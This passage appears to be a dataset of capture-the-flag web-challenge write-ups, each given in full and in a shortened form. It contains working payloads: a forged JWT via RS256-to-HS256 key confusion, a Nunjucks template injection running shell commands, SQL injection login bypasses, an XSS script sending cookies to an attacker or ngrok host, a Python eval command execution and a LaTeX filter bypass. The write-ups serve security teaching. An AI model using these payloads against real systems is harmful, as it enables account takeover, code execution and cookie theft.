    python3 jwt_tool.py -T ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTNuWlpMWHB3R3prVXM0N1J6UkRpXG5idkNFZzFFcllrcC9LWk1hclVqZTVWRGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUXG4rVHd3VHM3Y2toRG8rczFUVjhHV0RkWFFrb0l1dHRaak5DUUo2TG0zQ3ZlbEtJWW1jSUtwdlBCblRlRlJkMVh6XG5xUmdldnE2SlZSQ1lyeVFYMXhtckVQOVc5OFpWWGJQcE9GOTRHUWlpRU1RdWJNMGlMakdjVEFqRldVdXFaZlU3XG5iMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2htMDV0L0ZraU95XG55dVgwa0FFcDFKNzRRZXRMSXg0d0tmbjBIZjZXeUp0ejB2ZnV6YkJETWh2VDZyZXBtSXpCVW9ycHh6bk5UVForXG5xd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tIiwiaWF0IjoxNjM4NzMxMzQ3fQ.bnjglGFat38YIylfRdN-AubHq7FIpPgrISj3rGlVUJti_8ORBgF6alQDyEr742vUYaFaaONnhUlgSKyurANLKI1fNpAZCp0loN5D_mSk8B8PMSNArghxLB1P_2g36pd7ZWE8GQPFF2582fOYCK1zJreMKPozXGe3fjBNB6nqrNk21ReFQsPpuLfPM8HgK3jPXgyN5mN4HKMsLgObrA-5W3IhWglV64BHuNbpki5x0OGMedxTEtzuYqAhQbkOhz7x_GLI8c04lyJSY9dYVaNSsmU84gZJZ-5Hmk4GlQTtRwrV_OnSVxampPUk8MhIIeLHhUOiaWrRtmLbxiV1EaPK6g"" -S hs256 -p ""-----BEGIN PUBLIC KEY-----
    MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi
    bvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT
    +TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz
    qRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7
    b1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy
    yuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+
    qwIDAQAB
    -----END PUBLIC KEY-----""
    ```

    It's a pretty ugly command. You should be able to copy and paste the public key into a file called `key.pub` and then do something like `python3 jwt_tool.py -X k -pk key.pub -pc username -pv admin` (`-X` tells jwt_tool.py to use the key confustion exploit, which is what we want, and `-pk` tells it what key to use), but this didn't work for me. Also, [the aforementioned guide](https://habr.com/en/post/450054/) should work too, but they both genereate invalid tokens. I'm not sure what I'm missing to get those tools working. By the way, [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256) is an automated version of [the aforementioned guide](https://habr.com/en/post/450054/).

    The output of this command has the tampered token, which is `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGsiOiItLS0tLUJFR0lOIFBVQkxJQyBLRVktLS0tLVxuTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzblpaTFhwd0d6a1VzNDdSelJEaVxuYnZDRWcxRXJZa3AvS1pNYXJVamU1VkRpY3Q5czF4RVZDNWlxb1ZidlNFZHdIaDdydDNKdWlGSCswT1U5VmNCVFxuK1R3d1RzN2NraERvK3MxVFY4R1dEZFhRa29JdXR0WmpOQ1FKNkxtM0N2ZWxLSVltY0lLcHZQQm5UZUZSZDFYelxucVJnZXZxNkpWUkNZcnlRWDF4bXJFUDlXOThaVlhiUHBPRjk0R1FpaUVNUXViTTBpTGpHY1RBakZXVXVxWmZVN1xuYjFqQ1dZSG9QOFFlenZjQStRQlJ3Vzdnbmx6QmFVQkZlTTd2OEpsN3ArRlVxbUJyOVYrTmtobTA1dC9Ga2lPeVxueXVYMGtBRXAxSjc0UWV0TEl4NHdLZm4wSGY2V3lKdHowdmZ1emJCRE1odlQ2cmVwbUl6QlVvcnB4em5OVFRaK1xucXdJREFRQUJcbi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLSIsImlhdCI6MTYzODczMTM0N30.Eo4x1pdGAmIyQTZhCl7kUkuSxiCZvmAPU1G2s5i9erY`.

6. Anyway, once you have the tampered token, swap it out with the non-admin token in your browser's developer tools. Now, we can access the admin dashboard and the `/api/elf/edit` and `/api/elf/list` endpoints.

7. Back in the source code, if we look at the `challenge/routes/index.js` file we see that the `/` endpoint uses the `CardHelper` class to generate the card with a list of the elf's names. Since we are now an admin, we can edit the names of these elfs, and thus we control this value. Looking at `challenge/helpers/CardHelper.js`, we notice that the `nunjucks` templating engine is used and that we can contol what is passed to a `nunjucks` template. Thus, this is a `nunjucks` SSTI (Server-Side Template Injection).

8. Searching for ""nunjucks ssti"" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.

9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.

### Alternative JWT Decoding Steps

1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).

2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/): `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----`.

3. Base64 encode the public key with `echo -en ""public key"" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.

    Command:

    ```bash
    echo -en ""-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3nZZLXpwGzkUs47RzRDi\nbvCEg1ErYkp/KZMarUje5VDict9s1xEVC5iqoVbvSEdwHh7rt3JuiFH+0OU9VcBT\n+TwwTs7ckhDo+s1TV8GWDdXQkoIuttZjNCQJ6Lm3CvelKIYmcIKpvPBnTeFRd1Xz\nqRgevq6JVRCYryQX1xmrEP9W98ZVXbPpOF94GQiiEMQubM0iLjGcTAjFWUuqZfU7\nb1jCWYHoP8QezvcA+QBRwW7gnlzBaUBFeM7v8Jl7p+FUqmBr9V+Nkhm05t/FkiOy\nyuX0kAEp1J74QetLIx4wKfn0Hf6WyJtz0vfuzbBDMhvT6repmIzBUorpxznNTTZ+\nqwIDAQAB\n-----END PUBLIC KEY-----"" | base64
    ```

    Output:

    ```
    LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FR
    OEFNSUlCQ2dLQ0FRRUEzblpaTFhwd0d6a1VzNDdSelJEaQpidkNFZzFFcllrcC9LWk1hclVqZTVW
    RGljdDlzMXhFVkM1aXFvVmJ2U0Vkd0hoN3J0M0p1aUZIKzBPVTlWY0JUCitUd3dUczdja2hEbytz
    MVRWOEdXRGRYUWtvSXV0dFpqTkNRSjZMbTNDdmVsS0lZbWNJS3B2UEJuVGVGUmQxWHoKcVJnZXZx
    NkpWUkNZcnlRWDF4bXJFUDlXOThaVlhiUHBPRjk0R1FpaUVNUXViTTBpTGpHY1RBakZXVXVxWmZV
    NwpiMWpDV1lIb1A4UWV6dmNBK1FCUndXN2dubHpCYVVCRmVNN3Y4Smw3cCtGVXFtQnI5VitOa2ht
    MDV0L0ZraU95Cnl1WDBrQUVwMUo3NFFldExJeDR3S2ZuMEhmNld5SnR6MHZmdXpiQkRNaHZUNnJl
    cG1JekJVb3JweHpuTlRUWisKcXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
    ```

4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to ""HS256"" and change the `username` field to ""admin"". Next, paste the base64 encoded key into the ""your-256-bit-secret"" field. Check the ""secret base64 encoded"" box, and now you should have your tampered JWT.

### Flag

`HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}`
","1. Looking at the source code we see that in the `challenge/helpers/JWTHelper.js` file, both the ""RS256"" and ""HS256"" algorithms are allowed for decryption. This is CVE-2016-5431/CVE-2016-10555.

2. The HS256 algorithm is symmetric, which means it uses the sane secret key to sign and verify each message. The RS256 algorithm is asymmetric, which means it uses a private key to sign the message and a public key for verification. However, if we change the algorithm from RS256 to HS256, the backend code will use the public key as the symmetric secret key. In other words, the HS256 algorithm will be used to verify the signature with the public key as the HS256 secret key. We know the public key so we can, in theory, easily modify the JWT and sign it.

3. However, before we can do this we need to get the JWT token and get the public key. So, make an account on the website, open up your browser's cookie page in the developer tools, and copy the `session` cookie. We can use [JWT.io](https://jwt.io/) or [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) to decode the cookie.
[Python command: Use jwt_tool.py to decode the JWT token]

4. Fortunately for us, the public key is encoded in the JWT. So, to get access to the `/api/elf/edit` and `/api/elf/list` endpoints, we need to tamper with this token to change the `username` to ""admin"" using the RS256-to-HS256 exploit.

5. There are an abundance of ways that you can perform the RS256-to-HS256 exploit: [3v4Si0N/RS256-2-HS256](https://github.com/3v4Si0N/RS256-2-HS256), [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool), manually via [JWT.io](https://jwt.io/), by running the commands in [this excellent guide](https://habr.com/en/post/450054/). However, you have to be very careful about newlines in the public key. I tried all of these methods with about every option possible. One way that worked is by running a command using `jwt_tool.py`, providing the JWT and public key as input, applying the key confusion exploit and specifying the username to be changed to ""admin"".
Alternatively, see [Alternative JWT Decoding Steps](#alternative-jwt-decoding-steps) for an approach using [JWT.io](https://jwt.io/).

The output of this command has the tampered token.

6. Anyway, once you have the tampered token, swap it out with the non-admin token in your browser's developer tools. Now, we can access the admin dashboard and the `/api/elf/edit` and `/api/elf/list` endpoints.

7. Back in the source code, if we look at the `challenge/routes/index.js` file we see that the `/` endpoint uses the `CardHelper` class to generate the card with a list of the elf's names. Since we are now an admin, we can edit the names of these elfs, and thus we control this value. Looking at `challenge/helpers/CardHelper.js`, we notice that the `nunjucks` templating engine is used and that we can contol what is passed to a `nunjucks` template. Thus, this is a `nunjucks` SSTI (Server-Side Template Injection).

8. Searching for ""nunjucks ssti"" reveals [this great guide](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) about breaking out of the `nunjucks` templating engine. We can run `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` to print the contents of the `/flag` file. We determined that this is where the flag is by looking at the `Dockerfile` in the challenge ZIP. The `flag` file is copied to `/flag` within the container.

9. So, in the admin dashboard, we copy and paste out payload `{{range.constructor(""return global.process.mainModule.require('child_process').execSync('cat /flag*')"")()}}` into one off the elf's name field, submit the changes, and then we navigate back to the home page, `/`, and there's the flag. You can view the source of this page to make copy and pasting the flag easier.

### Alternative JWT Decoding Steps

1. Get a JWT token from the application by signing into any account and paste it into [JWT.io](https://jwt.io/).

2. Copy the public key and make sure that there is no new line at the end. I got this public key from [JWT.io](https://jwt.io/):
[Public key obtained from JWT.io]

3. Base64 encode the public key with `echo -en ""public key"" | base64`. We use the `-e` and `-n` flags with `echo` to tell it to intepret escape sequences and to not output a newline at the end.
[Bash command: Base64 encode the public key]

4. Paste the JWT into [JWT.io](https://jwt.io/) again. Then, change change the algorithm to ""HS256"" and change the `username` field to ""admin"". Next, paste the base64 encoded key into the ""your-256-bit-secret"" field. Check the ""secret base64 encoded"" box, and now you should have your tampered JWT.
"
"# Toy Management (300)

## Problem

> The evil elves have changed the admin access to Santa's Toy Management Portal. Can you get the access back and save the Christmas?

* [web_toy_management.zip](./web_toy_management.zip)

## Solution

1. The website is a simple login page.

2. After looking at the source code for a while, I noticed that the `database.sql` file contains the password hashes for a manager and admin user. [CrackStation](https://crackstation.net/) is a great way to see if these are known hashes, so I pasted them both in and got the credentials `manager:bigsanta!` and `admin:tryharder`.

3. `manager:bigsanta!` is a valid login by `admin:tryharder` is not. After signing in we can see a list of toys and some other properties.

4. Looking back at the source code in the `database.sql` file we see that the flag is contained in the database with the rest of the toys, but it has the approved value set to 0 instead of 1.

5. In `challenge/routes/index.js` we see that the `/api/toylist` endpoint will set `approved` to 1 unless the currently signed in user has the username `admin`. So, we have to sign in as admin.

6. My first thought was that this was a JWT challenge since JWTs are used and we are given a user with valid credentials. However, after poking around, the `database.js` source code shows that users are authenticated like so: `let stmt = ""SELECT username FROM users WHERE username = '${user}' and password = '${pass}'\"";`. This looks like it could be vulnerable to a SQL injection.

7. On the main login page, I tried some common SQL injection payloads from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). The one that ended up working was username `admin' -- ` and the password can be anything. This will show us the final ""unapproved toy"" which is the flag.

### Flag

`HTB{1nj3cti0n_1s_in3v1t4bl3}`
","1. The website is a simple login page.

2. After looking at the source code for a while, I noticed that the `database.sql` file contains the password hashes for a manager and admin user. [CrackStation](https://crackstation.net/) is a great way to see if these are known hashes, so I pasted them both in and got the credentials `manager:bigsanta!` and `admin:tryharder`.

3. `manager:bigsanta!` is a valid login by `admin:tryharder` is not. After signing in we can see a list of toys and some other properties.

4. Looking back at the source code in the `database.sql` file we see that the flag is contained in the database with the rest of the toys, but it has the approved value set to 0 instead of 1.

5. In `challenge/routes/index.js` we see that the `/api/toylist` endpoint will set `approved` to 1 unless the currently signed in user has the username `admin`. So, we have to sign in as admin.

6. My first thought was that this was a JWT challenge since JWTs are used and we are given a user with valid credentials. However, after poking around, the `database.js` source code shows that users are authenticated like so: `let stmt = ""SELECT username FROM users WHERE username = '${user}' and password = '${pass}'\"";`. This looks like it could be vulnerable to a SQL injection.

7. On the main login page, I tried some common SQL injection payloads from [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass). The one that ended up working was username `admin' -- ` and the password can be anything. This will show us the final ""unapproved toy"" which is the flag.
"
"# Toy Workshop (300)

## Challenge

> The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?

* [web_toy_workshop.zip](web_toy_workshop.zip)

## Solution

1. Let's start by looking at the `challenge/index.js` file in the source code zip. The application connects to a sqlite database (`const db = new Database('toy_workshop.db');`), so lets look at `database.js`.

2. `database.js` allows for adding and reading items from the database. While we do control the `query` variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.

3. Let's look at the `challenge/routes/index.js` file. There is an `/api/submit` endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls `bot.readQueries(db)`. The `/queries` endpoint simply returns all the queries contained in the database. We cannot access the `/queries` endpoint because the IP address must be `127.0.0.1`, which is the localhost loopback address, otherwise the page redirects to `/`.

4. Next, let's check out `challenge/bot.js` so we can figure out what `bot.readQueries(db)` does. `bot.js` imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a `flag` variable that holds the flag, loads the index page of the application, sets the `flag` cookie in the browser, visits the `/queries` endpoint, and then exits.

5. This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the `/queries` page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.

6. The malicious code is standard XSS code: `<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>`. We redirect to our webpage by changing the `document.location` and we set the `c` argument to `document.cookie`, which contains the current page's cookies.

7. However, we need to actually run a server to receive this request and log the cookie. There is a basic [Flask](https://flask.palletsprojects.com), a micro web framework written in Python, application that does exactly this in [xss-cookie-stealer.py](xss-cookie-stealer.py). The script defines one route, `/`, that will read the `c` parameter in the request URL, open a file called `cookies.txt`, write the contents of the `c` parameter to that file, and then redirect to `https://google.com`. We run this server on all interfaces (`0.0.0.0`) on port `16361`.

8. You can run this script anywhere that is internet accessible. For instance you can port forward port `16361` through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use [ngrok](https://ngrok.com/).

9. Create an account at <https://ngrok.com/>, download the application, and get logged in. Now, start the Flask python server with `python xss-cookie-stealer.py` and then run `/ngrok http 16361`. Ngrok will display a URL in the form `http://<subdomain>.ngrok.io`.

10. Paste your ngrok URL into the malicious payload. If ngrok said my URL was `http://92832de0.ngrok.io`, then the payload should be `<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>`

11. Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the `cookies.txt` file.

### Flag

`HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`
","1. Let's start by looking at the `challenge/index.js` file in the source code zip. The application connects to a sqlite database (`const db = new Database('toy_workshop.db');`), so lets look at `database.js`.

2. `database.js` allows for adding and reading items from the database. While we do control the `query` variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.

3. Let's look at the `challenge/routes/index.js` file. There is an `/api/submit` endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls `bot.readQueries(db)`. The `/queries` endpoint simply returns all the queries contained in the database. We cannot access the `/queries` endpoint because the IP address must be `127.0.0.1`, which is the localhost loopback address, otherwise the page redirects to `/`.

4. Next, let's check out `challenge/bot.js` so we can figure out what `bot.readQueries(db)` does. `bot.js` imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a `flag` variable that holds the flag, loads the index page of the application, sets the `flag` cookie in the browser, visits the `/queries` endpoint, and then exits.

5. This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the `/queries` page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.

6. The malicious code is standard XSS code: `<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>`. We redirect to our webpage by changing the `document.location` and we set the `c` argument to `document.cookie`, which contains the current page's cookies.

7. However, we need to actually run a server to receive this request and log the cookie. There is a basic [Flask](https://flask.palletsprojects.com), a micro web framework written in Python, application that does exactly this in [xss-cookie-stealer.py](xss-cookie-stealer.py). The script defines one route, `/`, that will read the `c` parameter in the request URL, open a file called `cookies.txt`, write the contents of the `c` parameter to that file, and then redirect to `https://google.com`. We run this server on all interfaces (`0.0.0.0`) on port `16361`.

8. You can run this script anywhere that is internet accessible. For instance you can port forward port `16361` through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use [ngrok](https://ngrok.com/).

9. Create an account at <https://ngrok.com/>, download the application, and get logged in. Now, start the Flask python server with `python xss-cookie-stealer.py` and then run `/ngrok http 16361`. Ngrok will display a URL in the form `http://<subdomain>.ngrok.io`.

10. Paste your ngrok URL into the malicious payload. If ngrok said my URL was `http://92832de0.ngrok.io`, then the payload should be `<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>`

11. Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the `cookies.txt` file.
"
"# Birdbuster Video
### Category: Web Exploitation
### Author: James Lowther (Articuler)

## Description
Weren't video rental stores the best?! See if you can break into this one!

## Hints
1. 80s action movies really inject you full of adrenaline!

## Solution
This challenge gives provides you a website with the ability to upload a barcode. The website will ""scan"" this barcode and will return information about the movie title that was encoded.

1. To solve this challenge, generate a barcode with a SQL injection that returns all rows using an online barcode generator.
    * For example, `' OR 1=1;  --  `
2. Upload the barcode to the website.
3. The flag can be found at the bottom of the returned results.

## Flag
magpie{80s_m0v135_4r3_th3_b35t}","Hint: ""80s action movies really inject you full of adrenaline!""

This challenge gives provides you a website with the ability to upload a barcode. The website will ""scan"" this barcode and will return information about the movie title that was encoded.

1. To solve this challenge, generate a barcode with a SQL injection that returns all rows using an online barcode generator.
    * For example, `' OR 1=1;  --  `
2. Upload the barcode to the website.
3. The flag can be found at the bottom of the returned results.
"
"# David Byrne and co. Online Tailors 
### Category: Web Exploitation 
### Author: Emily Baird (Analytical Engine) 

## Description 
Something seems off about these guys' calculations...

The flag is in `/flag/flag.txt`

## Hints
There is a vulnerability in the way that the server takes user input and processes it.

## Solution
We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: 

```python 
if request.method == 'POST':
    size = request.form['inputShoulder']
    try:
        size = eval(size)
        jacket = (size * 20) + 2
    except:
        jacket = 'There was an error calculating your jacket size.'

    return render_template('index.html', size=size, jacket=jacket)
```

This exploit relies on the dangerous use of Python's `eval()` function. When passed a string, `eval` will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings, (ie, sending ""1+1"" will return `2`), we can also use it to send lines of code that we want Python to run. By using the `subprocess` library, we can execute shell commands from within Python. Especially useful is the `getoutput()` function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at `/flag/flag.txt`, we can craft the following payload:

    `__import__('subprocess').getoutput('cat /flag/flag.txt'))`

## Flag
magpie{4int_no_party_4int_n0_d1sc0}","Hint: ""There is a vulnerability in the way that the server takes user input and processes it.""

We see that this website is running on Flask, and that the logic for dealing with the input form is as follows: 
[Flask code: Process input using the eval() function and calculate jacket size]

This exploit relies on the dangerous use of Python's `eval()` function. When passed a string, `eval` will attempt to evaluate the string as a Python expression. Though the intended use-case here is to do basic math with strings (e.g., sending ""1+1"" will return `2`), we can also use it to send lines of code that we want Python to run. By using the `subprocess` library, we can execute shell commands from within Python. Especially useful is the `getoutput()` function, which will return the output of the command as a string. With this knowledge, and knowing that the flag is at `/flag/flag.txt`, we can craft the following payload:
[Payload: Use Python subprocess library to execute a shell command and read the flag from /flag/flag.txt]
"
"# Devo(ps)
### Category: Web Exploitation
### Author: Emily Baird (Analytical Engine)

## Description
Did you know that the guys in DEVO thought that humanity was getting stupider? Luckily, we here at Magpie Inc. are here to prove them wrong!

## Hint 
Github can be used for more than just storing code. The 'Actions' tab at the top of the repo might provide some insight.

## Solution
This challenge's exploit takes advantage of a misconfigured GitHub Actions build script.

1. The description mentions that this is a 'fully-automated release.' Instead of a link to a C binary, the challenge links us to a GitHub repo from a user named [Magpie Inc](https://github.com/magpie-inc/flag-checker)
2. The `magpie-inc` user seems to have a single public repo. The source code for the binary, `flagchecker.c`, is out here in the open. Looking closer at the source code, it appears that our Flag-Checker 9000 takes user input, hashes the input using MD5, and compares the result to a macro called `FLAG_HASH`.
3. As the hint mentions, there seems to be a lot of code here that isn't related to `flagchecker.c`. Perhaps the exploit isn't in the source code of Flag-Checker 9000 itself?
4. In the folder `.github/workflows`, we find a file called `build_flag_checker.yml`. It appears that this GitHub Action is the automated script responsible for packaging Flag-Checker 9000.
5. Reading the script `./build.sh` referenced in step 'Build Flag Checker Program' we can see that it uses the 1st command-line argument as the value assigned to the macro. `build_flag_checker.yml` is using the output of a previous step as the arg to the 'Build Flag Checker Program' step: ""${{ steps.get_hash.outputs.HASH_VALUE }}""
6. The output of the 'Get hash' step is the result of a second bash script, `flaghash.sh`. This one appears to cURL an IP address, and then hashes the results using MD5. We know that `flagchecker.c` is converting the user's guess to an MD5 hash and tells us that our flag is right if our hash matches the value of `FLAG_HASH`. However, the value of the cookie 'auth' in the curl request is set to `${ secrets.FLAG_AUTH }` which doesn't seem to be accessible in any of the files. In the workflow runs (accessible under the 'actions' tab on the repo), the value of FLAG_AUTH is starred out.
7. The last thing to investigate is the commit history. We can see that there is a commit with the message 'Fix auth!!!' 
8. If we look at the changes made for the commit, we see that an earlier version was set up slightly differently, with the 'auth' cookie set in the code of `gethash.sh` itself.
9. Run `curl http://ipaddress/api.php --cookies 'auth=f4e53e561c6580d6d304f3f31e3102f5` for yourself, and the result is the flag!

## Flag
magpie{build_automation_genius}","Hint: ""Github can be used for more than just storing code. The 'Actions' tab at the top of the repo might provide some insight.""

This challenge's exploit takes advantage of a misconfigured GitHub Actions build script.

1. The description mentions that this is a 'fully-automated release.' Instead of a link to a C binary, the challenge links us to a GitHub repo from a user named [Magpie Inc](https://github.com/magpie-inc/flag-checker)

2. The `magpie-inc` user seems to have a single public repo. The source code for the binary, `flagchecker.c`, is out here in the open. Looking closer at the source code, it appears that our Flag-Checker 9000 takes user input, hashes the input using MD5, and compares the result to a macro called `FLAG_HASH`.

3. As the hint mentions, there seems to be a lot of code here that isn't related to `flagchecker.c`. Perhaps the exploit isn't in the source code of Flag-Checker 9000 itself?

4. In the folder `.github/workflows`, we find a file called `build_flag_checker.yml`. It appears that this GitHub Action is the automated script responsible for packaging Flag-Checker 9000.

5. Reading the script `./build.sh` referenced in step 'Build Flag Checker Program' we can see that it uses the 1st command-line argument as the value assigned to the macro. `build_flag_checker.yml` is using the output of a previous step as the arg to the 'Build Flag Checker Program' step: ""${{ steps.get_hash.outputs.HASH_VALUE }}""

6. The output of the 'Get hash' step is the result of a second bash script, `flaghash.sh`. This one appears to cURL an IP address, and then hashes the results using MD5. We know that `flagchecker.c` is converting the user's guess to an MD5 hash and tells us that our flag is right if our hash matches the value of `FLAG_HASH`. However, the value of the cookie 'auth' in the curl request is set to `${ secrets.FLAG_AUTH }` which doesn't seem to be accessible in any of the files. In the workflow runs (accessible under the 'actions' tab on the repo), the value of FLAG_AUTH is starred out.

7. The last thing to investigate is the commit history. We can see that there is a commit with the message 'Fix auth!!!' 

8. If we look at the changes made for the commit, we see that an earlier version was set up slightly differently, with the 'auth' cookie set in the code of `gethash.sh` itself.

9. Run a cURL command with the discovered auth cookie to access the IP address, and the result is the flag!
"
"# Richard Simmons: Sweatin' in LaTeX
### Category: Web Exploitation
### Author: James Lowther (Articuler)

## Description
Richard Simmons' new workout ""Sweatin' in LaTeX"" is out now! See if you can shimmy your way to the flag!

## Solution
The website appears to be a renderer for LaTeX code. Writing LaTex and clicking ""Generate PDF"" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.
2. LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.
3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package. By getting the `/` character from `index.html`, we can use it to build our path and bypass the blacklisted characters filter.
4. Using this we can write the following LaTeX code that will build the path and read the flag:
```
\documentclass{minimal}

% The xstring package allows us to use \StrMid
\usepackage{xstring}

% Define sections of the path to the flag
\def\a{sweatin}
\def\b{to}
\def\c{the}
\def\d{oldies}
\def\e{flag.txt}

% Read index.html and isolate the forward-s lash character into \s
\newread\file
\immediate\openin\file=index.html
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\StrMid{\fileline}{43}{43}[\s]
\immediate\closein\file

% Build the path the the flag and read it
\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
\loop\unless\ifeof\file
    \read\file to\fileline
    \message{\fileline}
\repeat
\closein\file

\begin{document}
\end{document} 
```

The flag can be found in the returned LOG data.

## Flag
magpie{r1ch4rd_l0v35_t0_5w34t}

*Inspired and derived from [the web90 challenge in Internetwache CTF 2016](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)*
","The website appears to be a renderer for LaTeX code. Writing LaTex and clicking ""Generate PDF"" gives a link to a rendered PDf. The output LOG of the LaTeX renderer will also be displayed. 

1. Looking at the source HTML indicates that we need to read the flag from a file found in `/sweatin/to/the/oldies/flag.txt`.

2. LaTeX is turing-complete and has the ability to read files, however, certain strings have been blacklisted. Most notably, `/` has been blacklisted making it challenging to create the path to read the file.

3. The `/` character however can be isolated from `index.html` using the `\StrMid` function from the `xstring` package. By getting the `/` character from `index.html`, we can use it to build our path and bypass the blacklisted characters filter.

4. Using this we can write the following LaTeX code that will build the path and read the flag:
[LaTeX code: Uses xstring package to bypass blacklisted characters, build the path to the flag, and read it]

The flag can be found in the returned LOG data.

*Inspired and derived from [the web90 challenge in Internetwache CTF 2016](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)*
"
"# The Smurfs Cipher
### Category: Web Exploitation
### Author: James Lowther (Articuler)

## Description
